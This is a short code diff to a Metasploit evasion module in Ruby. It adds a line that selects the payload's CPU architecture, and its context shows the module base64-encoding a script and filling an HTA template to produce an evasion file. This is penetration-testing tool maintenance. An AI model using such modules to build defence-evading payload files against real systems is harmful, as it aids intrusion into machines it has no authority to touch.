@@ -47,11 +47,11 @@ class MetasploitModule < Msf::Evasion
     jsnet_encoded = Rex::Text.encode_base64(js_file)
     # This is used in the ERB template
     fname = Rex::Text.rand_text_alpha(6)
+    arch = ["x86", "x64"].include?(payload.arch.first) ? payload.arch.first : "anycpu"
     hta_path = File.join(Msf::Config.data_directory, 'exploits', 'hta_evasion.hta')
     hta = File.read(hta_path)
     fail_with(Failure::NotFound, 'The HTA file was not found.') unless File.exists?(hta_path)
     hta_file = ERB.new(hta).result(binding())
-
     file_create(hta_file)
   end
 end
